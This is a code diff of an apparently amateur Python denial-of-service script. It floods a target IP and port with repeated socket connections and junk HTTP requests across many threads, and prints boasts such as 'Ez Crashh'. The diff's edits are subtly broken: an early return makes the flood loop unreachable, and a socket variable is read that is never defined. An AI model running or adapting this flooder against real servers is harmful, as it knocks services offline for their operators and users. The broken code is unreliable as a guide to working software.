@@ -147,6 +147,7 @@ def start2():
                for i in range(20000):
                    s.connect((str(ip),int(port)))
                    s.send(byte_host)
+                   xx += random.randint(0, int(pack))
                    print("Server Got Attack By Zan ")
             except:
                   s.close()
@@ -157,9 +158,10 @@ def start2():
   
 def start():
   global useragents, acceptall, ref, socks5
+  time.sleep(0.01)
+  data2 = client_socket.recv(23410)
   hh = random._urandom(75006)
   xx = int(0)
-  time.sleep(0.01)
   userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
   Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
   acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
@@ -168,6 +170,7 @@ def start():
   length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
   target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
   main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + "\r\n"
+  return data2
   while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -181,6 +184,11 @@ def start():
             s.close()
             print("Ez Crashh")
 for i in range(th):
-  th = threading.Thread(target=start)
-  th.start()
+  th1 = threading.Thread(target=start)
+  th2 = threading.Thread(target=start)
+  th1.start()
+  th2.start()
+for i in range(th):
+  th1.join()
+  th2.join()
   #aku mah pemula bisa apa?
